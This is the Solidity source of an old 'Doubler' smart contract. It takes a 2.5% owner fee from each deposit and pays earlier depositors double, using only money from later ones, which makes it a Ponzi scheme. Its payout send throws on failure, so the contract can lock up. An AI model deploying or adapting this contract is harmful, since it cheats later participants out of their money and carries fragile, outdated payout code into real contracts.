1 contract Doubler {
2 
3     struct Participant {
4         address etherAddress;
5         uint amount;
6     }
7 
8     Participant[] public participants;
9 
10 	uint public payoutIdx = 0;
11 	uint public collectedFees = 0;
12 	uint balance = 0;
13 
14   // only owner modifier
15 	address public owner;
16     modifier onlyowner { if (msg.sender == owner) _ }
17 
18   // contract Constructor
19     function Doubler() {
20         owner = msg.sender;
21     }
22 
23  // fallback function
24     function(){
25         enter();
26     }
27 
28 	function enter(){
29       // collect fee
30         uint fee = msg.value / 40; // 2.5 % fee
31         collectedFees += fee;
32 
33       // add a new participant
34 		uint idx = participants.length;
35         participants.length++;
36         participants[idx].etherAddress = msg.sender;
37         participants[idx].amount = msg.value - fee;
38 
39       // update available balance
40       	balance += msg.value - fee;
41       	
42 	  // if there are enough ether on the balance we can pay out to an earlier participant
43 	  	uint txAmount = participants[payoutIdx].amount * 2;
44         if(balance >= txAmount){
45         	if(!participants[payoutIdx].etherAddress.send(txAmount)) throw;
46 
47             balance -= txAmount;
48             payoutIdx++;
49         }
50     }
51 
52     function collectFees() onlyowner {
53         if(collectedFees == 0)return;
54 
55         if(!owner.send(collectedFees))throw;
56         collectedFees = 0;
57     }
58 
59     function setOwner(address _owner) onlyowner {
60         owner = _owner;
61     }
62 }